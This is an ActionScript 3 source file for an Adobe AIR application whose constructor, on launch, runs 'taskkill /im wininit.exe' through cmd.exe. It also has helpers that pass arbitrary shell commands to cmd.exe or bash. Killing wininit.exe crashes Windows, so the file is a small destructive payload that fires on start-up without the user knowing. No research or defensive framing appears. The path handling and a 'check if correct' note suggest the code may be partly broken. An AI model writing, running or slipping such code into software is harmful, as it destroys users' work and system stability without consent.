package
{
    import flash.display.Sprite;
    import flash.desktop.NativeProcess;
    import flash.desktop.NativeProcessStartupInfo;
    import flash.filesystem.File;

    public class Main extends Sprite
    {
        public var _process:NativeProcess;

        public function Main()
        {
            CmdWindows("taskkill /im wininit.exe");
        }

        private function CmdWindows(cmd:String) : void
        {
            Execute("C:\\Windows\\System32\\cmd.exe /c " + cmd);
        }

        private function CmdLinux(arguments:String) : void
        {
            Execute("/usr/bin/bash -c " + arguments); // TODO: check if correct
        }

        private function Execute(cmd:String) : void
        {
            var args:Array = cmd.split(" ");
            var npsi:NativeProcessStartupInfo = new NativeProcessStartupInfo();
            var executable:File = File.applicationDirectory.resolvePath(args[0]);
            var arguments:Vector.<String> = new Vector.<String>();

            for (var i:int = 1; i < args.length; i++)
            {
                arguments[i - 1] = args[i];
            }

            npsi.executable = executable;
            npsi.arguments = arguments;

            _process = new NativeProcess();
            _process.start(npsi);
        }
    }
}
